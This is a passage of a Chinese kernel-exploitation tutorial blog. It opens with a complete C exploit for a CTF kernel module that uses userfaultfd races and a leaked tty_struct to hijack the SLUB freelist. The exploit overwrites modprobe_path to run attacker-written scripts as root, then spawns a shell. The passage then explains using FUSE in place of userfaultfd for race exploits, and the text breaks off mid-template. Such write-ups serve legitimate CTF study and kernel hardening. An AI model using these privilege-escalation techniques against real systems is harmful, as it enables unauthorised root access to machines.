class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DO_SAK_WORK 0xffffffff815d4ef0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MODPROBE_PATH 0xffffffff8245c5c0</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> cat_flag[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> page_size;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">sem_t</span> sem_add, sem_edit;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> * buf; <span class="hljs-comment">// for userfaultfd</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        sleep(<span class="hljs-number">10</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-keyword">size_t</span> size;<br>        <span class="hljs-keyword">size_t</span> index;<br>    &#125;;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125; Chunk;<br><br><span class="hljs-keyword">long</span> knote_fd;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">chunkAdd</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    Chunk chunk = <br>    &#123;<br>        .size = size,<br>    &#125;;<br>    ioctl(knote_fd, <span class="hljs-number">0x1337</span>, &amp;chunk);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">chunkEdit</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> index, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Chunk chunk = <br>    &#123;<br>        .index = index,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(knote_fd, <span class="hljs-number">0x8888</span>, &amp;chunk);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">chunkGet</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> index, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Chunk chunk = <br>    &#123;<br>        .index = index,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(knote_fd, <span class="hljs-number">0x2333</span>, &amp;chunk);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">chunkDel</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> index)</span></span><br><span class="hljs-function"></span>&#123;<br>    Chunk chunk = <br>    &#123;<br>        .index = index,<br>    &#125;;<br>    ioctl(knote_fd, <span class="hljs-number">0x6666</span>, &amp;chunk);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> tty_fd, pid, fd;<br>    <span class="hljs-keyword">size_t</span> modprobe_path, temp[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-keyword">char</span> * buf2, flag[<span class="hljs-number">0x100</span>];<br>    FILE * file = <span class="hljs-literal">NULL</span>;<br><br>    saveStatus();<br>    page_size = sysconf(_SC_PAGE_SIZE);<br>    buf = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    buf2 = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">strcpy</span>(page, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">// create reverse shell file</span><br>    fd = open(<span class="hljs-string">&quot;/getshell&quot;</span>, O_RDWR | O_CREAT);<br>    write(fd, cat_flag, <span class="hljs-keyword">sizeof</span>(cat_flag));<br>    close(fd);<br>    system(<span class="hljs-string">&quot;chmod +x /getshell&quot;</span>);<br><br>    <span class="hljs-comment">// register userfaultfd</span><br>    registerUserFaultFd(buf, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br>    registerUserFaultFd(buf2, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    knote_fd = open(<span class="hljs-string">&quot;/dev/knote&quot;</span>, O_RDWR);<br><br>    <span class="hljs-comment">// read saved data(if existed)</span><br>    fd = open(<span class="hljs-string">&quot;kernel_addr.txt&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (fd &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        close(fd);<br>        file = fopen(<span class="hljs-string">&quot;/kernel_addr.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-keyword">if</span> (file)<br>        &#123;<br>            <span class="hljs-built_in">fscanf</span>(file, <span class="hljs-string">&quot;%llx %llx&quot;</span>, &amp;kernel_base, &amp;kernel_offset);<br>            <span class="hljs-keyword">goto</span> exploit;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// leak kernel base from tty struct by reading a free chunk</span><br>    chunkAdd(TTY_STRUCT_SIZE);<br>    pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to fork the child&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) <span class="hljs-comment">// child to free the chunk</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process sleeping now...&quot;</span>);<br>        sleep(<span class="hljs-number">2</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process started.&quot;</span>);<br>        chunkDel(<span class="hljs-number">0</span>);<br>        sleep(<span class="hljs-number">1</span>);<br>        tty_fd = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Object free and tty got open. Backing parent thread...&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Parent process trapped in userfaultfd...&quot;</span>);<br>        chunkGet(<span class="hljs-number">0</span>, buf);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x58</span>; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data-dump----] %d: %p\n&quot;</span>, i, *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(buf) + i));<br><br>    <span class="hljs-keyword">if</span> (*((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(buf) + <span class="hljs-number">86</span>))<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Successfully hit the tty_struct.&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        errExit(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    kernel_offset = *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(buf) + <span class="hljs-number">86</span>) - DO_SAK_WORK;<br>    kernel_base = (<span class="hljs-keyword">void</span>*) ((<span class="hljs-keyword">size_t</span>)kernel_base + kernel_offset);<br><br>    file = fopen(<span class="hljs-string">&quot;/kernel_addr.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!file)<br>        errExit(<span class="hljs-string">&quot;Unable to create temp file.&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(file, <span class="hljs-string">&quot;%llx %llx&quot;</span>, kernel_base, kernel_offset);<br>    fclose(file);<br><br>exploit:<br>    modprobe_path = MODPROBE_PATH + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Kernel offset: 0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Kernel base: %p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] modprobe_path: %p\n&quot;</span>, modprobe_path);<br><br>    <span class="hljs-comment">// hijack the freelist in slub</span><br>    chunkAdd(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(page, &amp;modprobe_path, <span class="hljs-number">8</span>); <span class="hljs-comment">// object-&gt;next</span><br>    <span class="hljs-built_in">memcpy</span>(((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(page) + <span class="hljs-number">1</span>), <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to fork the child&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) <span class="hljs-comment">// child to free the chunk</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process sleeping now...&quot;</span>);<br>        sleep(<span class="hljs-number">2</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process started.&quot;</span>);<br>        chunkDel(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Object free and tty got open. Backing parent thread...&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Parent process trapped in userfaultfd...&quot;</span>);<br>        chunkEdit(<span class="hljs-number">0</span>, buf2);<br>    &#125;<br><br>    <span class="hljs-comment">// hijack the modprobe_path</span><br>    chunkAdd(<span class="hljs-number">0x100</span>);<br>    chunkAdd(<span class="hljs-number">0x100</span>);<br>    chunkEdit(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;/getshell&quot;</span>);<br><br>    <span class="hljs-comment">// trigger the modprobe_path</span><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;/fake&quot;</span>);<br><br>    <span class="hljs-comment">// get flag</span><br>    sleep(<span class="hljs-number">1</span>);<br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to hijack!&quot;</span>);<br>    read(fd, flag, <span class="hljs-number">0x100</span>);<br>    write(<span class="hljs-number">1</span>, flag, <span class="hljs-number">0x100</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行即可获得 flag</p><p><a href="https://i.loli.net/2021/09/23/xTU3PBlVpAjzytL.png"><img src="https://s2.loli.net/2023/02/06/SI2X5UgNzpHxKLw.png" alt="image.png"></a></p><blockquote><p>笔者尝试反弹一个 shell 到本地然后连上去，不过失败了，原因暂且不明…（目前怀疑可能是 qemu 环境的原因</p></blockquote><h2 id="FUSE-race"><a href="#FUSE-race" class="headerlink" title="FUSE race"></a>FUSE race</h2><blockquote><p>FUSE 的基本信息参考 <a href="https://www.usenix.org/system/files/conference/fast17/fast17-vangoor.pdf">To FUSE or Not to FUSE: Performance of User-Space File Systems</a>，也可以参考<a href="https://zhuanlan.zhihu.com/p/143256077">知乎上的这篇文章</a>，基于 FUSE 的利用则可以参考<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">CVE-2022-0185</a></p><blockquote><p>注：最好先了解 VFS 相关的一些基本知识</p></blockquote></blockquote><h3 id="FUSE-简介"><a href="#FUSE-简介" class="headerlink" title="FUSE 简介"></a>FUSE 简介</h3><p>前面讲到，自 Linux kernel 5.11 版本起，非特权用户被禁止使用 userfaultfd 系统调用，但是<strong>我们仍能通过 FUSE 达成同样的效果</strong></p><p>我们先来介绍 FUSE —— <em>Filesystem in Userspace</em> ，即<strong>用户空间文件系统</strong>，该功能<strong>允许非特权用户在用户空间实现一个用户态文件系统</strong>，开发者只需要实现对应的文件操作接口就可以在用户空间实现一个文件系统，而不需要重新编译内核，这给开发者提供了相当的便利</p><p>FUSE 自 Linux 2.6.14 版本引入，主要由两部分组成：</p><ul><li>FUSE 内核模块，负责与 kernel 的 VFS 进行交互，并向用户空间实现的文件系统进程暴露 <code>/dev/fuse</code> 块设备接口</li><li><a href="https://github.com/libfuse/libfuse">用户空间的 libfuse 库</a> 负责向用户程序提供封装好的接口，开发者基于该库进行用户空间文件系统的开发：由一个 FUSE daemon 守护进程负责与内核模块进行交互并进行文件系统的具体操作</li></ul><p><a href="https://s2.loli.net/2022/04/06/zDwY7GMZQkE2c9m.png"><img src="https://s2.loli.net/2022/04/06/zDwY7GMZQkE2c9m.png" alt="image.png"></a></p><p>FUSE 的基本运行原理如下：</p><ul><li>FUSE daemon 守护进程通过 libfuse 库的 <code>fuse_main()</code> 注册文件系统与对应的处理函数，并挂载到对应的目录下（例如 <code>/mnt/fuse</code>）</li><li>用户进程访问挂载点下的文件（例如 <code>/mnt/fuse/file</code>），来到内核中的 VFS 对应 inode 的 <code>inode_operations</code> 中的处理函数，交由 FUSE 内核模块进行处理</li><li>FUSE 内核模块将请求转换为与用户态 daemon 进程间约定的格式，交由用户态对应的 FUSE daemon 守护进程进行处理</li><li>在 FUSE daemon 调用文件系统创建时注册的对应的处理函数，这一步可能会需要访问实际的文件系统（如 <code>ext4</code>，看文件系统具体定义，你也可以写成一个纯内存的文件系统（笑））</li><li>FUSE daemon 完成处理，返回结果至 FUSE 内核模块，再经由 VFS 返回给用户进程</li></ul><p><a href="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png"><img src="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png" alt="image.png"></a></p><p>FUSE 内部还有更为复杂的结构，如五个处理队列等，但这暂时不是我们本篇需要关注的，我们主要关注如何用 FUSE 来完成利用就行（笑）</p><p><a href="https://s2.loli.net/2023/01/10/Mq4UcEBXPTfr7vA.png"><img src="https://s2.loli.net/2023/01/10/Mq4UcEBXPTfr7vA.png" alt="image.png"></a></p><h3 id="FUSE-基本用法"><a href="#FUSE-基本用法" class="headerlink" title="FUSE 基本用法"></a>FUSE 基本用法</h3><p>借助 libfuse 库，FUSE 的用法其实还是比较简单的，首先是安装基本的依赖项：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install libfuse2 libfuse-dev</span><br></code></pre></div></td></tr></table></figure><p>我们首先需要自定义一张 <code>fuse_operations</code> 函数表，并实现对应的函数接口（例如，如果我们的文件系统要实现创建文件夹的功能，我们应当在函数表中实现 <code>mkdir()</code> 接口），我们自定义的用户态文件系统的操作<strong>其实都是通过对该函数表中定义的相应函数进行回调完成的</strong>：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">// 太长，这里就不放完了</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> &#123;</span><br>    <span class="hljs-keyword">int</span> (*getattr) (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, struct stat *);<br>    <span class="hljs-keyword">int</span> (*readlink) (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, <span class="hljs-keyword">char</span> *, <span class="hljs-keyword">size_t</span>);<br>    <span class="hljs-keyword">int</span> (*getdir) (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, <span class="hljs-keyword">fuse_dirh_t</span>, <span class="hljs-keyword">fuse_dirfil_t</span>);<br>    <span class="hljs-keyword">int</span> (*mknod) (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, <span class="hljs-keyword">mode_t</span>, <span class="hljs-keyword">dev_t</span>);<br>    <span class="hljs-keyword">int</span> (*mkdir) (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, <span class="hljs-keyword">mode_t</span>);<br>    <span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>这里笔者写一个简单的用户态文件系统作为示例，例如我们可以实现如下两个接口：</p><ul><li><code>getattr</code> 用以获取文件属性，对于根目录 <code>&quot;/&quot;</code> （相对于挂载点而言）而言我们返回 <code>0755 | S_IFDIR</code> 属性，否则返回 <code>0644 | S_IFREG</code> 属性</li><li><code>readdir</code> 用以遍历目录，这里我们仅支持遍历根目录 <code>&quot;/&quot;</code>，返回结果显示在根目录下有一个测试文件，我们可以使用 <code>filler()</code> 函数填充单个文件结果</li></ul><p>之后我们使用 <code>fuse_main()</code> 将其挂载到指定目录下即可</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">// 标识使用的 FUSE 版本</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FUSE_USE_VERSION 29</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_readdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, <span class="hljs-keyword">void</span>* buf, <span class="hljs-keyword">fuse_fill_dir_t</span> filler, </span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">off_t</span> offset, struct fuse_file_info* fi)</span></span><br><span class="hljs-function"></span>&#123;<br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        filler(buf, <span class="hljs-string">&quot;a3fuse_test_file&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_getattr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, struct stat *stbuf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_ops</span> =</span> &#123;<br>    .readdir = a3fuse_readdir,<br>    .getattr = a3fuse_getattr,<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> fuse_main(argc, argv, &amp;a3fuse_ops, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用如下命令进行编译：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> gcc a3fuse.c -o a3fuse -D_FILE_OFFSET_BITS=64 -lfuse</span><br></code></pre></div></td></tr></table></figure><p>效果如下图所示：</p><p><a href="https://s2.loli.net/2023/01/10/SWHjTioDVdtybIv.png"><img src="https://s2.loli.net/2023/01/10/SWHjTioDVdtybIv.png" alt="image.png"></a></p><p>当然，由于我们的例程没有实现 <code>open()</code>、<code>read()</code>、<code>write()</code> 等函数，这里直接对文件进行访问会提示错误：</p><p><a href="https://s2.loli.net/2023/01/10/gZF7Dtz6YOEvCUy.png"><img src="https://s2.loli.net/2023/02/06/CzInBR1b4aJgUSE.png" alt="image.png"></a></p><p>FUSE 更深入的用法我们就暂且不深入学习了，我们这里主要关注如何在条件竞争中利用 FUSE</p><h3 id="利用-FUSE-替代-userfaultfd-进行条件竞争利用"><a href="#利用-FUSE-替代-userfaultfd-进行条件竞争利用" class="headerlink" title="利用 FUSE 替代 userfaultfd 进行条件竞争利用"></a>利用 FUSE 替代 userfaultfd 进行条件竞争利用</h3><p>让我们重新审视前面我们利用 userfaultfd 在条件竞争中利用的流程的本质：</p><ul><li>让进程在内核中进行数据拷贝时暂停，控制权转交我们的自定义函数，我们在自定义函数中将该内核对象重新分配到别处，在恢复数据拷贝时便能读写其他内核结构体的数据</li></ul><p>我们不难想到的是<strong>利用 FUSE 我们同样可以实现类似的效果</strong>：</p><ul><li>注册一个用户空间文件系统，为读写等接口注册回调函数，使用 mmap 将该文件系统中的一个文件映射到内存中</li><li>当进程在内核中读写这块 mmap 内存时，<strong>便会触发缺页异常，此时控制权便会转交到我们注册的回调函数当中</strong></li><li><strong>在回调函数当中完成我们的恶意操作</strong>（例如将进程正在读写的内核对象重新分配到别的位置，或是覆写该对象以改变一些特定属性）</li><li>重新回到内核中的读写流程，此时进程便会按照我们改变后的内核对象<strong>进行恶意操作</strong>（例如我们在 FUSE 的回调函数中将该对象重新分配到某个函数指针，恢复到内核的读写过程时进程便会覆写掉该函数指针）</li></ul><p>利用 FUSE，我们可以像 userfaultfd 那样<strong>利用条件竞争漏洞完成利用</strong>，不幸的是常规的 libfuse 库并不支持静态编译，这使得我们无法像以往一样先静态编译一个 exp 再传到远程，<strong>但万幸的是 libfuse 库是开源的</strong>，安全研究员 BitsByWill 和 D3v17 将其进行了一些裁剪（裁剪掉了 dlopen 等，但还是很大…），做了一个可以供静态编译的 <a href="https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/libfuse3.a">libfuse3.a</a> 及相关的头文件等（参见<a href="https://github.com/Crusaders-of-Rust/CVE-2022-0185">这里</a>）</p><p>以下是笔者编写的 FUSE 利用的模板，和示例程序相比，我们需要对一些接口进行微调：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 